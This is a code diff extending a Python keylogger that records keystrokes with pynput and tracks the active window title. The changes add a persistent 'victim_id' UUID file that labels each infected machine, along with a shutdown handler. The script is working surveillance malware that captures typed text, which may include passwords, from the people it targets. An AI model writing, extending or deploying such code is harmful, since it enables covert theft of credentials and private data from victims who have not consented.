@@ -1,12 +1,23 @@
 import threading
 import os
 from pynput import keyboard
+import uuid
 import pygetwindow as gw
 
 # --- Global Variables ---
 log = ""  # Stores the keystrokes
 path = os.path.join(os.getcwd(), "log.txt")
 _report_timer = None  # This will hold our timer object
+active_window_title = "" # Grouped with the others
+
+UUID_FILE = "victim_id.txt"
+if os.path.exists(UUID_FILE):
+    with open(UUID_FILE, "r") as f:
+        victim_uuid = f.read().strip()
+else:
+    victim_uuid = str(uuid.uuid4())
+    with open(UUID_FILE, "w") as f:
+        f.write(victim_uuid)
 
 # --- Functions ---
 active_window_title = ""
@@ -76,8 +87,16 @@ keyboard_listener = keyboard.Listener(
     on_release=on_release,
 )
 
+# ... (all your previous code)
+
 print("Keylogger started. Press ESC to stop.")
 with keyboard_listener:
-    keyboard_listener.join()
+    try:
+        keyboard_listener.join()
+    except KeyboardInterrupt:
+        # This block will run if the user presses Ctrl+C
+        print("\nCtrl+C detected. Forcing shutdown.")
+        # As a final measure, we can explicitly tell the listener to stop
+        keyboard_listener.stop()
 
 print("Keylogger stopped.")
